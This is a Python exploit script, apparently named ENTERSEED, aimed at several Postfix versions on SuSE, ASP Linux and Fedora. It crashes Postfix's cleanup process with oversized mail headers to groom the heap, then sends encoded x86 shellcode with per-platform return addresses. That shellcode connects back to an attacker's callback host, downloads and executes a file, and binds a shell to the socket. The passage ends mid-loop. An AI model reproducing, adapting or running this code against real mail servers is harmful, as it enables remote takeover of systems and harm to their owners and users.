#!/usr/bin/env python

# Oct. 25 2004
import exceptions
import socket
import string
import sys
import os
import signal
import smtplib
import time
import sha
from math import ceil,floor,fabs
from random import Random


### Set up callbackhandler
#from CallbackServer import *
#from SuccessRequestHandler import *

# ENTERSEED version
ENTERSEED_version = "1.4.0.1"

def done(signal, frame):
	sys.exit(0)


path_to_asc = "./asc"
path_to_DUL = "./DUL"
#just some temp file names
unencoded_file = "tmp.unencoded"
encoded_file = "tmp.encoded"
msg_prefix = 'msg'

#initialize list of alphanumerics
alphanums = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'

#initialize random number generator
g = Random(time.localtime())

def getRandAlphaNums(length):
	str = ""
    	for i in range(0, length):
		#str += "A"
		str += alphanums[g.randrange(len(alphanums))];
	return str

# These bytes have no purpose. c'est la vie.
plain_cmdshellcode_back = \
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00"
           
#original encoder/decoder scheme by rabutl2.  postfix-2.0.14-41 on SuSE 9.0 garbles
#the decoder to pieces, so I opted for DULEncoder
decoder_wench = \
    '\x74\x3f\x75\x3d\x8a\x1e\x80\xeb\x61\x30\xd8\x81\xc6\x02\x01\x01' + \
	'\x01\x81\xee\x01\x01\x01\x01\xc3\x8b\x34\x24\x89\xf7\x31\xc0\xe8' + \
	'\xe0\xff\xff\xff\x80\xfb\x19\x74\x1d\xc1\xe0\x04\xe8\xd3\xff\xff' + \
	'\xff\x88\x07\x81\xc7\x02\x01\x01\x01\x81\xef\x01\x01\x01\x01\xeb' + \
	'\xdc\xe8\xd2\xff\xff\xff'


def getNextAddress(address):
	byte0 = ord(address[0]) + search_scale
	byte1 = ord(address[1])
	byte2 = ord(address[2])
	byte3 = ord(address[3])

	while (byte0 > 255):
		byte0 = byte0 - 256 	
		byte1 = byte1 + 1
		while (byte1 > 255):
			byte1 = byte1 - 256 	
			byte2 = byte2 + 1
			while (byte2 > 255):
				byte2 = byte2 - 256 	
				byte3 = byte3 + 1
	byte3 = byte3%256
	print "Trying address: %s %s %s %s" % (hex(byte3),hex(byte2),hex(byte1),hex(byte0))
	address = chr(byte0) + chr(byte1) + chr(byte2) + chr(byte3) + address[4:]
	return address	

def sendMsg2(target_ip, message,s):
	data = "mail from: %s\r\n" % from_user
	#print "client: %s"  %data
	try:
		s.send(data)
	except socket.error:
		print "Socket Error in sendMsg2"
		return "ERR"
	data = s.recv(1024)
	#print "server: %s"  %data
	if(data[0:3] != "250" and not bruteforce):
		print "server: %s" % data
		print "Exiting due to mail delivery error. Maybe you need to change the sender and/or recipient addresses.\n"
		sys.exit(1)
	elif (data[0:3] != "250"):
		print "server: %s" % data
		return data
	data = "rcpt to: %s\r\n" % to_user
	#print "client: %s"  %data
	s.send(data)
	data = s.recv(1024)
	#print "server: %s" % data
	if(data[0:3] != "250" and not bruteforce):
		print "server: %s" % data
		print "Exiting due to mail delivery error. Maybe you need to change the sender and/or recipient addresses.\n"
		sys.exit(1)
	elif (data[0:3] != "250"):
		print "server: %s" % data
		return data
	data = 'data\r\n'
	#print "client: %s" % data
	s.send(data)
	data = s.recv(1024)
	#print "server: %s"  % data
	s.send(message)
	s.send("\r\n.\r\n")
	accept_response = s.recv(1024)
	#print "server: %s" % accept_response
	return accept_response

def sendMsg(target_ip, message):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target_ip, 25))
	data = s.recv(1024)
	data = "mail from: %s\r\n" % from_user
	s.send(data)
	data = s.recv(1024)
	data = "rcpt to: %s\r\n" % to_user
	s.send(data)
	data = s.recv(1024)
	data = 'data\r\n'
	s.send(data)
	data = s.recv(1024)
	s.send(message)
	s.send("\r\n.\r\n")
	accept_response = s.recv(1024)
	print "server: %s" % accept_response
	data = "quit\r\n"
	s.send(data)
	data = s.recv(1024)
	s.close()
	return accept_response

def crashLoop(target_ip):
	crash_count =0
	os.mkdir("crash_%s" % crash_count)
	message_count=0
	while(1):
		message=""
		message += "Return-Path:"	
		message +=  alphanums[1] * g.randrange(200,4000)
		message += ": Operator <root@theaddress.net>\r\n"
		message += "From:"	
		message +=  alphanums[2] * g.randrange(200,4000)
		message += ": Operator <root@theaddress.net>\r\n"
		message += "Date:"	
		message +=  alphanums[3] * g.randrange(200,4000)
		message += ": Operator <root@theaddress.net>\r\n"
		f=open("crash_%s/message_%s.log" % (crash_count, message_count), 'w')
		f.write(message)
		f.close()
		try:
			response = sendMsg(target_ip, message)
		except:
			pass
		message_count += 1
		if(response[0:3] == "451"):
			crash_count += 1
			os.mkdir("crash_%s" % crash_count)
			message_count = 0
			continue
		#the sleeps in this script are only empirically based- they might change 
		#based on target host hardware.  This one makes sure that cleanup can 
		#finish processing each message by the time the next one comes
		#otherwise, it will spawn more cleanup processes to share the load and
		#complicate our attempt to control the state of the heap 
		time.sleep(beforeCrashSleep)

def crashCleanup2(target_ip,s):
	while(1):
		message=""
		message += "Return-Path:"	
		message +=  alphanums[g.randrange(len(alphanums))] * g.randrange(200,2000)
		message += ": Operator <root@theaddress.net>\r\n"
		message += "From:"	
		message +=  alphanums[g.randrange(len(alphanums))] * g.randrange(200,2000)
		message += ": Operator <root@theaddress.net>\r\n"
		message += "Date:"	
		message +=  alphanums[g.randrange(len(alphanums))] * g.randrange(200,2000)
		message += ": Operator <root@theaddress.net>\r\n"
		response = sendMsg2(target_ip, message,s)
		if(response[0:3] == "451"):
			break
		time.sleep(beforeCrashSleep)

#a more randomized and hopefully less recognizable crashCleanup
def crashCleanup3(target_ip,s):
	response=""
	while(1):
		message=""
		message += "Return-Path:%s: %s %s %s %s<%s@%s.%s>\r\n"	% (getRandAlphaNums(g.randrange(200,1000)),getRandAlphaNums(4),getRandAlphaNums(2),\
			getRandAlphaNums(3),getRandAlphaNums(4),getRandAlphaNums(4),getRandAlphaNums(10),getRandAlphaNums(3))
		#message += "From:%s<%s>\r\n" % ( getRandAlphaNums(g.randrange(200,2000)), getRandAlphaNums(19))
		message += "Date:%s\r\n" % (getRandAlphaNums(g.randrange(2000,4000)))
		response = sendMsg2(target_ip,message,s)
		if(response[0:3] == "451" or response[0:3] == "ERR"):
			break
		time.sleep(beforeCrashSleep)


def encoder_wench(input_string):
    # Work (in C) to arrive at this encoding/decoding scheme attributed
    encoded_string = []
                 
    input_string_length = len(input_string)
    for i in range(0, input_string_length):
        # Combining the leading/trailing nibbles with 'a'
        #   to form each successive byte of the encoded
        #   string...definitely NOT rocket science, but
        #   it gets us through the filter...which is cool...
        next_byte = ord(input_string[i])
        encoded_string += chr(0x61 + ((next_byte >> 4) & 0xf))
        encoded_string += chr(0x61 + (next_byte & 0xf))
        
    # 'z' as the terminator...
    encoded_string += chr(0x7a)
    
    return(encoded_string)

# this is a call out for the Alphanumeric Shellcode Compiler by Ceazar
# does the job, but at almost 10x the space of the original shellcode
# next, please
def ascEncode(unencoded_shellcode):
	f=open(unencoded_file, 'w');
	f.write(unencoded_shellcode); 
	f.close()
	os.system("%s -astack -scall -fbin -o %s %s" %(path_to_asc,encoded_file,unencoded_file))
	f=open(encoded_file,'r');	
	#should only be one line
	encoded_shellcode = f.readline() 
	f.close()
	os.remove(unencoded_file)
	os.remove(encoded_file)
	return(encoded_shellcode)

# the Digits+Uppercase+Lowercase encoder by rabutl2. only ~2.5x 
# original shellcode. sweet.
def DULEncode(unencoded_shellcode):
	f=open(unencoded_file, 'w');
	f.write(unencoded_shellcode); 
	f.close()
	print "Running DUL encoder on shellcode"
	os.system("%s %s %s > /dev/null" %(path_to_DUL,unencoded_file,encoded_file))
	f=open(encoded_file,'r');	
	#should only be one line
	encoded_shellcode = f.readline() 
	f.close()
	#os.remove(unencoded_file)
	#os.remove(encoded_file)
	return(encoded_shellcode)

#print "Arguments: ", sys.argv
hash = sha.new()
f=open(sys.argv[0])
hash.update(f.read())
print "ENTERSEED version: ", ENTERSEED_version
print "SHA hash:", hash.hexdigest()

if(len(sys.argv) < 6):
	print "ENTERSEED v%s" % ENTERSEED_version
	print "Usage: %s <target-ip> <target-port> <callback-ip> <callback-port> <platform> -to [e-mail] -from [e-mail] -helo [host]" % sys.argv[0]
	print "Options:         -to [e-mail]         The e-mail address the message being sent to, i.e. root@host.domain.com"
	print "                 -from [e-mail        The e-mail address the message being sent from, i.e root@sender.other_domain.com"
	print "                 -helo [host]         Sender hostname and domain, i.e. sender.other_domain.com"
	print "Platforms	1: SuSE 9.0 RPM (postfix-2.0.14-41) from short hostname (0-19 chars)"
	print "         	2: SuSE 9.0 RPM (postfix-2.0.14-41) from long hostname (17-43 chars)"
	print "         	3: SuSE 9.1 RPM (postfix-2.0.19_20040312-11) "
	print "         	4: ASP Linux 9 RPM (postfix-2.0.8-1asp) from long hostname (17-43 chars)"
	#print "         	5: SuSE 9.2 RPM (postfix-2.1.5)"
	#print "         	6: Debian 3.1 (sarge) DEB (postfix-2.1.5)"
	#print "         	7: Fedora Core 2 RPM (postfix-2.0.18XXX)"
	sys.exit(1)

	
#                           ______________________   
# =========================[   Platform Settings  ]=============================
#                           ----------------------   
#postfix 2.0.19, compiled from source on RH8.0
buffer_lengths_postfix2019src = [ [489, 1399, 1459], [1085, 1749, 757]]
addresses_postfix2019src ='\x94\x89\07\x08\x04\xf9\xff\xbf'
shellcode_front_postfix2019src = 'BBBBBBBx\x12BBBBBBBBBBBBBBBBBBB'
max_shellcode_len_postfix2019src = 327 + 78*16;
number_of_messages_postfix2019src = 2
#indexes (count from 0)
shellcode_at_msg_postfix2019src = 1
shellcode_at_hdr_postfix2019src = 1
#
#postfix 2.0.14-41 SuSE 9.0 binary rpm 
buffer_lengths_SuSE90 = [ [826, 1456, 1585],[672,997,1699]]
#addresses_SuSE90 = '\x02\x77\x08\x08\x38\x02\x3d\x40'
#addresses_SuSE90 = '\x88\x76\x08\x08\x38\x02\x3d\x40'
addresses_SuSE90 = '\xec\xa1\x08\x08\xa8\xd5\x06\x08'
#shellcode_front_SuSE90 = 'CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC'
#shellcode_front_SuSE90 = 'CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\x57\x59\x81\xc1\xff\xff\x01\x01\x81\xe9\x01\x01\x01\x01\xff\xe1'
shellcode_front_SuSE90 = 'CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\x31\xc0\x59\x84\xc0\x75\x06\x48\xe8\xf5\xff\xff\xff'
nop_sled_offset_SuSE90 = 47
max_shellcode_len_SuSE90 = 1544
number_of_messages_SuSE90 = 2
#indexes (count from 0)
shellcode_at_msg_SuSE90 = 1
shellcode_at_hdr_SuSE90 = 2
#postfix 2.0.14-41 from SERVFAIL host
buffer_lengths_SuSE90_2 = [ [503,1809,301],[1044,1214,1996]]
addresses_SuSE90_2 = '\x72\x39\x08\x08\xa8\xd5\x06\x08'
shellcode_front_SuSE90_2 = 'CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\x31\xc0\x59\x84\xc0\x75\x06\x48\xe8\xf5\xff\xff\xff'
nop_sled_offset_SuSE90_2 = 47
max_shellcode_len_SuSE90_2 = 1544
number_of_messages_SuSE90_2 = 2
#indexes (count from 0)
shellcode_at_msg_SuSE90_2 = 1
shellcode_at_hdr_SuSE90_2 = 2


# postfix-2.0.19_20040312-11 SuSE 9.1 binary rpm 
buffer_lengths_SuSE91 = [ [640,1306,1853],[1125,1076,1358]]
addresses_SuSE91 = '\x70\x13\x08\x08\x50\x17\x07\x08'
#shellcode_front_SuSE91 = '\x68\x43\x2d\x08\x08\x75\x06\x74\x04CCCC\x59'
#shellcode_front_SuSE91 = 'CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\x56\x59\x81\xc1\xff\xff\x01\x01\x81\xe9\x01\x01\x01\x01\xff\xe1'
shellcode_front_SuSE91 = 'CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\x31\xc0\x59\x84\xc0\x75\x06\x48\xe8\xf5\xff\xff\xff'
nop_sled_offset_SuSE91 = 47
max_shellcode_len_SuSE91 = 1544
number_of_messages_SuSE91 = 2
#indexes (count from 0)
shellcode_at_msg_SuSE91 = 1
shellcode_at_hdr_SuSE91 = 2

#postfix 2.0.8-1asp ASP Linux 9.0 
#0x8070638
#0x8080628
#0x8070560
buffer_lengths_ASP = [ [557, 1297, 1592],[1153,1647,890]]
#addresses_ASP = '\xcb\x01\x08\x08\x30\x06\x07\x08'
addresses_ASP = '\xd0\x04\x08\x08\x60\x05\x07\x08'
#shellcode_front_ASP = 'CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC'
#shellcode_front_ASP = 'CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\x81\xc1\xff\xff\xff\xff\xff\xe1'
#shellcode_front_ASP= 'CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\x56\x59\x81\xc1\xff\xff\x01\x01\x81\xe9\x01\x01\x01\x01\xff\xe1'
shellcode_front_ASP = 'CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\x31\xc0\x59\x84\xc0\x75\x06\x48\xe8\xf5\xff\xff\xff'
nop_sled_offset_ASP = 47
#max_shellcode_len_ASP = 1552
max_shellcode_len_ASP = 1544
number_of_messages_ASP = 2
#indexes (count from 0)
shellcode_at_msg_ASP = 1
shellcode_at_hdr_ASP = 1

# Fedora Core 2
buffer_lengths_FC2 = [ [530,1306,1853],[1125,1076,1658]]
#addresses_FC2 = '\xd0\x22\x07\x08\x21\x74\x05\x08'
#addresses_FC2 = '\x34\x23\x07\x08\xf4\x35\x07\x08'
addresses_FC2 = '\x84\x23\x07\x08\x62\x31\x06\x08'
shellcode_front_FC2 = '\x68\x43\x2d\x08\x08\x75\x06\x74\x04CCCC\x59'
max_shellcode_len_FC2 = 1589
number_of_messages_FC2 = 2
#indexes (count from 0)
shellcode_at_msg_FC2 = 1
shellcode_at_hdr_FC2 = 2
#0x8057421

#settings for the wild - these might be used to tweak the reliability
gen2 = 0;
justcrash = 0
crashloop = 0
bruteforce = 0
nocrash = 0
only99 = 0
do99 = 0
keep_socket = 1
sleep99 = .25
beforeCrashSleep = .5
afterCrashSleep = 1
loopSleep = 5
address_search = 0
target = ""
extratrigger = 0
nohelo = 0

#bruteforce ranges
initial_offset1= 0
initial_offset2 = 0 
initial_step1= 1 
initial_step2= 1 
max_offset1= 1000
max_offset2 = 1000
holdoffset1 = 0
holdoffset2 = 0
randomoffset1 = 0

#deal with diversity

if(sys.argv[5] == '0'):
	print "Creating messages for postfix-2.0.19 compiled from src"
	buffer_lengths 		= buffer_lengths_postfix2019src 
	addresses 			= addresses_postfix2019src 
	shellcode_front 	= shellcode_front_postfix2019src 
	max_shellcode_len 	= max_shellcode_len_postfix2019src  
	number_of_messages 	= number_of_messages_postfix2019src 
	shellcode_at_msg 	= shellcode_at_msg_postfix2019src 
	shellcode_at_hdr 	= shellcode_at_hdr_postfix2019src 
	nop_sled_offset		= nop_sled_offset_postfix2019src 
elif (sys.argv[5] == '1'):
	print "Creating messages for SuSE 9.0 (RPM) postfix-2.0.14-41 (from short hostname)"
	buffer_lengths 		= buffer_lengths_SuSE90_2 
	addresses 		= addresses_SuSE90_2
	shellcode_front 	= shellcode_front_SuSE90_2
	max_shellcode_len 	= max_shellcode_len_SuSE90_2 
	number_of_messages 	= number_of_messages_SuSE90_2
	shellcode_at_msg 	= shellcode_at_msg_SuSE90_2
	shellcode_at_hdr 	= shellcode_at_hdr_SuSE90_2
	nop_sled_offset		= nop_sled_offset_SuSE90_2
elif (sys.argv[5] == '2'):
	print "Creating messages for SuSE 9.0 (RPM) postfix-2.0.14-41 (from long hostname)"
	buffer_lengths 		= buffer_lengths_SuSE90 
	addresses 			= addresses_SuSE90
	shellcode_front 	= shellcode_front_SuSE90
	max_shellcode_len 	= max_shellcode_len_SuSE90 
	number_of_messages 	= number_of_messages_SuSE90
	shellcode_at_msg 	= shellcode_at_msg_SuSE90
	shellcode_at_hdr 	= shellcode_at_hdr_SuSE90
	nop_sled_offset		= nop_sled_offset_SuSE90
#elif (sys.argv[5] == '3'):
#	print "Creating messages for SuSE 9.1 (RPM) postfix-2.0.19_20040312-11"
#	buffer_lengths 		= buffer_lengths_SuSE91 
#	addresses 		= addresses_SuSE91
#	shellcode_front 	= shellcode_front_SuSE91
#	max_shellcode_len 	= max_shellcode_len_SuSE91 
#	number_of_messages 	= number_of_messages_SuSE91
#	shellcode_at_msg 	= shellcode_at_msg_SuSE91
#	shellcode_at_hdr 	= shellcode_at_hdr_SuSE91
#	nop_sled_offset		= nop_sled_offset_SuSE91

elif (sys.argv[5] == '4'):
	print "Creating messages for ASP Linux 9 (RPM) postfix-2.0.8-1asp"
	buffer_lengths 		= buffer_lengths_ASP
	addresses 		= addresses_ASP
	shellcode_front 	= shellcode_front_ASP
	max_shellcode_len 	= max_shellcode_len_ASP 
	number_of_messages 	= number_of_messages_ASP
	shellcode_at_msg 	= shellcode_at_msg_ASP
	shellcode_at_hdr 	= shellcode_at_hdr_ASP
	nop_sled_offset		= nop_sled_offset_ASP
elif (sys.argv[5] == '3'):
	print "Creating messages for SuSE 9.1 (RPM) postfix-2.0.19-20040312"
	gen2 = 1;
	target = "SUSE91";
	buffer_lengths 		= buffer_lengths_SuSE91 
	addresses 		= addresses_SuSE91
	shellcode_front 	= shellcode_front_SuSE91
	max_shellcode_len 	= max_shellcode_len_SuSE91 
	number_of_messages 	= number_of_messages_SuSE91
	shellcode_at_msg 	= shellcode_at_msg_SuSE91
	shellcode_at_hdr 	= shellcode_at_hdr_SuSE91
	nop_sled_offset		= nop_sled_offset_SuSE91
elif (sys.argv[5] == '5'):
	print "Creating messages for SuSE 9.2 (RPM) postfix-2.1.5"
	gen2 = 1;
	target = "SUSE92";
	buffer_lengths 		= buffer_lengths_SuSE91 
	addresses 		= addresses_SuSE91
	shellcode_front 	= shellcode_front_SuSE91
	max_shellcode_len 	= max_shellcode_len_SuSE91 
	number_of_messages 	= number_of_messages_SuSE91
	shellcode_at_msg 	= shellcode_at_msg_SuSE91
	shellcode_at_hdr 	= shellcode_at_hdr_SuSE91
	nop_sled_offset		= nop_sled_offset_SuSE91
elif (sys.argv[5] == '6'):
	print "Creating messages for Debian 3.1 (sarge) (DEB) postfix-2.1.5"
	gen2 = 1;
	target = "DEBIAN31";
elif (sys.argv[5] == '7'):
	print "Creating messages for Red Hat Enterprise Linux 3.6 postfix-2.0.16-4"
	gen2 = 1;
	target = "RHEL3.6";
elif (sys.argv[5] == '8'):
	print "Creating messages for Fedora Core 2 (RPM) postfix-2.0.18"
	buffer_lengths 		= buffer_lengths_FC2 
	addresses 		= addresses_FC2
	shellcode_front 	= shellcode_front_FC2
	max_shellcode_len 	= max_shellcode_len_FC2 
	number_of_messages 	= number_of_messages_FC2
	shellcode_at_msg 	= shellcode_at_msg_FC2
	shellcode_at_hdr 	= shellcode_at_hdr_FC2
	nop_sled_offset		= nop_sled_offset_FC2

#                           ______________________   
# =========================[   Target  Settings   ]=============================
#                           ----------------------   
#gen1 defs
if(gen2!=1):
	addresses_len = len(addresses)
	shellcode_front_len = len(shellcode_front)
#set target ip and sender/receiver names 
target_ip = sys.argv[1]
target_port = int(sys.argv[2])
#get the callback ip and port and make it shellcode-happy
host =  socket.inet_aton(sys.argv[3])
callback_port =  int(sys.argv[4])
port_low = callback_port & 0xff
port_high  = (callback_port >> 8) & 0xff
port_str = "%c%c" %(port_low,port_high)

#jmpSledSize should be a multiple of the number of instructions (3)
jmpSledSize = 900
postShellcodePad = 100

#must be 3 characters long!
uploaded_filename = 'ncd'
#message must be addressed to a valid recipient. 'root' often works
to_user = 'root'
from_user = 'root'
helo_hostname = 'localhost'

if(len(sys.argv) >= 6):
	i=6;
	while i < len(sys.argv):
		if(sys.argv[i][0:len("-to")] == "-to"):
			to_user = sys.argv[i][len("-to"):] 
			if(to_user == ""):
				i=i+1;
				to_user = sys.argv[i]
		elif(sys.argv[i][0:len("-from")] == "-from"):
			from_user = sys.argv[i][len("-from"):] 
			if(from_user == ""):
				i=i+1;
				from_user = sys.argv[i]
		elif(sys.argv[i][0:len("-helo")] == "-helo"):
			helo_hostname = sys.argv[i][len("-helo"):] 
			if(helo_hostname == ""):
				i=i+1;
				helo_hostname = sys.argv[i]
		elif(sys.argv[i][0:len("-filename")] == "-filename"):
			uploaded_filename = sys.argv[i][len("-filename"):] 
			if(len(uploaded_filename) >3):
				print "Error: Uploaded filename must be 3 characters!"
				sys.exit(1)
		elif(sys.argv[i][0:len("-search")] == "-search"):
			address_search = 1
			str = sys.argv[i][len("-search"):]
			if(str== ""):
				i=i+1;
				str= sys.argv[i]
			search_scale = int(str);
		elif(sys.argv[i][0:len("-max_offset1")] == "-max_offset1"):
			str = sys.argv[i][len("-max_offset1"):]
			if(str== ""):
				i=i+1;
				str= sys.argv[i]
			max_offset1 = int(str);
		elif(sys.argv[i][0:len("-max_offset2")] == "-max_offset2"):
			str = sys.argv[i][len("-max_offset2"):]
			if(str== ""):
				i=i+1;
				str= sys.argv[i]
			max_offset2 = int(str);
		elif(sys.argv[i][0:len("-start1")] == "-start1"):
			str = sys.argv[i][len("-start1"):]
			if(str== ""):
				i=i+1;
				str= sys.argv[i]
			initial_offset1 = int(str);
		elif(sys.argv[i][0:len("-start2")] == "-start2"):
			str = sys.argv[i][len("-start2"):]
			if(str== ""):
				i=i+1;
				str= sys.argv[i]
			initial_offset2 = int(str);
		elif(sys.argv[i][0:len("-step1")] == "-step1"):
			str = sys.argv[i][len("-step1"):]
			if(str== ""):
				i=i+1;
				str= sys.argv[i]
			initial_step1 = int(str);
		elif(sys.argv[i][0:len("-step2")] == "-step2"):
			str = sys.argv[i][len("-step2"):]
			if(str== ""):
				i=i+1;
				str= sys.argv[i]
			initial_step2 = int(str);
		elif(sys.argv[i] == "-getcallback"):
			signal.signal(signal.SIGUSR1,done)
			#signal.signal(signal.SIGCHLD,done)
			child = os.fork()
			if(child):
				print "Spawning child process (%d) to listen for callback" % child
				server = CallbackServer(('',callback_port),SuccessRequestHandler)
				try:
					server.handle_request()
					os.kill(child,signal.SIGUSR1)
					os.wait()
					sys.exit(0)
				except KeyboardInterrupt:
					sys.exit(0)
		elif(sys.argv[i] == "-extratrigger"):
			extratrigger = 1
		elif(sys.argv[i] == "-randomoffset1"):
			randomoffset1 = 1
		elif(sys.argv[i] == "-holdoffset1"):
			holdoffset1 = 1
		elif(sys.argv[i] == "-holdoffset2"):
			holdoffset2 = 1
		elif(sys.argv[i] == "-nohelo"):
			nohelo = 1
		#secret options. these might be used to tune the heap 
		#but testing shows defaults are best!
		elif(sys.argv[i] == "-justcrash"):
			justcrash = 1
		elif(sys.argv[i] == "-crashloop"):
			crashloop = 1
		elif(sys.argv[i] == "-bruteforce"):
			bruteforce = 1
		elif(sys.argv[i] == "-nocrash"):
			nocrash = 1
		else:
			print "Unknown option: %s" % sys.argv[i]
			sys.exit(1)
		i = i+1
	if (nocrash == justcrash == 1):
		print "-nocrash and -justcrash are mutually exclusive!"
		sys.exit(1)

#                           ______________________   
# =========================[       Shellcode      ]=============================
#                           ----------------------   
#  Because some versions of postfix chroot cleanup to /var/spool/postfix,
#  anything we want to do we have to bring with us.  The shellcode below
#  opens a socket to "host" at "port" and reads until it receives an EOF.
#  As it reads, it writes the incoming data to a file and then executes 
#  the file. The stdin and stdout descriptors are dup'ed to the socket, 
#  so if the program's input and output should go over the socket.
plain_cmdshellcode_front = \
	'\x33\xc0' + \
	'\x68' 	       + "%s" % host + \
	'\x68\x02\x00' + "%c%c" %(port_high,port_low) +\
    	'\x89\xe7' + \
    	'\x50' + \
    	'\x6a\x01' + \
    	'\x6a\x02' + \
    	'\x89\xe1' + \
    	'\xb0\x66' + \
    	'\x31\xdb' + \
    	'\x43'+ \
    	'\xcd\x80' + \
    	'\x6a\x10' + \
    	'\x57'+ \
    	'\x50'+ \
	'\x89\xc7' + \
    	'\x89\xe1' + \
    	'\xb0\x66' + \
    	'\x43'+ \
    	'\x43'+ \
    	'\xcd\x80' + \
	'\x3c\x00' + \
	'\x75\x75' + \
    	'\x31\xc0' + \
    	'\x50' + \
	'\x68' + "/%s" %uploaded_filename[0:3] + \
	'\x68' + 'ming' + \
	'\x68' + 'inco' + \
	'\x89\xe3' + \
	'\x33\xc9' + \
	'\xb9\x41\x02\x00\x00' + \
	'\xba\xff\x01\x00\x00' + \
	'\xb0\x05' + \
	'\xcd\x80' + \
	'\x3c\x00' + \
	'\x76\x4f' + \
	'\x89\xc6' + \
	'\x33\xc0' + \
	'\x01\xe0' + \
	'\x04\x50' + \
	'\x8b\xc8' + \
	'\x33\xd2' + \
	'\xb2\x01' + \
	'\x89\xfb' + \
	'\x33\xc0' + \
	'\xb0\x03' + \
    	'\xcd\x80' + \
	'\x3c\x00' + \
	'\x74\x0e' + \
	'\x89\xf3' + \
	'\x33\xc0' + \
	'\xb0\x04' + \
	'\xcd\x80' + \
	'\x3c\x00' + \
	'\x76\x29' + \
	'\xeb\xe6' + \
	'\x89\xf3' + \
	'\xb0\x06' + \
    	'\xcd\x80' + \
	'\x89\xfb' + \
    	'\x31\xc9' + \
    	'\xb1\x03' + \
    	'\x31\xc0' + \
    	'\xb0\x3f' + \
    	'\x49'     + \
    	'\xcd\x80' + \
    	'\x41'     + \
    	'\xe2\xf6' + \
    	'\x89\xe3' + \
    	'\x31\xc0' + \
    	'\x50'     + \
 	'\x53'     + \
	'\x89\xe1' + \
    	'\x99'     + \
    	'\xb0\x0b' + \
    	'\xcd\x80' + \
	'\xb0\x0a' + \
	'\xcd\x80' + \
	'\x89\xd8' + \
    	'\x31\xc0' + \
	'\xb0\x01' + \
    	'\xcd\x80'
# ============================================================================


plain_cmdshellcode = \
    plain_cmdshellcode_front + \
    plain_cmdshellcode_back;
plain_cmdshellcode_length = len(plain_cmdshellcode);

#encode shellcode to all alphanumeric
if(justcrash ==0):
	final_encoded_shellcode = DULEncode(plain_cmdshellcode);
	final_encoded_shellcode_length = len(final_encoded_shellcode);

#
#                           ______________________   
# =========================[   Generate Messages  ]=============================
#                           ----------------------   

if (crashloop == 1):
	print "Crash loop start\n"
	while(1):
		crashLoop(target_ip)	
elif (gen2==0):
	while(1):
		if(keep_socket == 1):
			#for some versions,
			#keep an open socket across the crash messages and the exploit messages.
			#for some reason, if we close the socket after the crash, cleanup starts
			#up again and screws up the heap.
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((target_ip, target_port))
			data = s.recv(1024)
			print "server: %s" % data
			data ="helo %s\r\n" % helo_hostname
			print "client: %s" % data
			s.send(data)
			data = s.recv(1024)
		
		#crashCleanup loops through sending packets with long headers designed to crash 
		#the cleanup process. We know cleanup has crashed when we receive a '451 Error: 
		# queue file write error' - if we send the exploit immediately, it will attack
		#a pristine, unsuspecting heap. rock.
		message=""
		if(nocrash == 0 and only99 == 0):
			if(keep_socket):
				crashCleanup2(target_ip,s)	
			else:
				crashCleanup(target_ip)	
			print "Got crash!"
		if(justcrash == 1 ):
			"Exiting..\n"
			sys.exit(0)
	
		
		#the cleanup process by default only processes 100 messages at a time
		#if we know the state, we can predict when we get a clean heap
		#after a crash+closed socket, cleanup will come back up and process 
		#the last message- or something. At any rate, sending 99 messages 
		#will reliably cause it to exit
		#NOTE: this method is kind of lame b/c if anyone sends a message 
		#during our 99, the count gets off.
		if(do99 == 1 or only99 == 1):
			print "Sending 99 messages to force cleanup exit."
			message=""
			message += "Return-Path: <root@theaddress.net>\r\n"
			message += "From: <root@theaddress.net>\r\n"
			message += "Date: This is <root@theaddress.net>\r\n"
			message += "Subject: test message\r\n"
			message += "This is a test message. Please ignore.\r\n"
			message += alphanums[g.randrange(len(alphanums))] * g.randrange(2,300)
			#keep the same socket for the 99msgs
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((target_ip, target_port))
			data = s.recv(1024)
			print "server: %s" % data
		
			for j in range(0,99):
				print "Message %d" %j
				sendMsg2(target_ip,message,s)
				time.sleep(sleep99)
		
		if(only99 ==1):
			sys.exit(0)
			
		#this may need to be tuned for specific targets. The idea here is that you
		#want to give the process enough time to exit- otherwise it seems that 
		#postfix starts up cleanup differently and it screws up the stack.
		print "A moment of silence for the process we just killed.\n"
		time.sleep(afterCrashSleep)
			
		if(keep_socket == 0):
		#for some versions,
		#keep an open socket across the crash messages and the exploit messages.
		#for some reason, if we close the socket after the crash, cleanup starts
		#up again and screws up the heap.
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((target_ip, target_port))
			data = s.recv(1024)
			print "server: %s" % data
		
		for i in range(0,number_of_messages):
			print "Generating message %d:"  %(i)
			message=""
			
			message_name = msg_prefix + "%d" %(i)
		
			message +="Return-Path:"
			if(shellcode_at_msg == i and shellcode_at_hdr == 0): 
				print("Message %d, Header 0: INSERTING SHELLCODE: total length: %d" % (i,buffer_lengths[i][0]))
				if (final_encoded_shellcode_length < max_shellcode_len):
					for jmps in range(0,(jmpSledSize)/3):
						message += "\xeb\x7f\x90"	
					message +='C' * (max_shellcode_len - final_encoded_shellcode_length - (jmpSledSize + postShellcodePad))
				else: 
					print "Warning: shellcode too long!"
	
				message +=shellcode_front
				message +=final_encoded_shellcode
				message += 'C' * postShellcodePad
	
				if(address_search==1):
					addresses = getNextAddress(addresses)
	
				message +=addresses
				message +='E' * (buffer_lengths[i][0]-shellcode_front_len-max_shellcode_len-addresses_len)
			else:
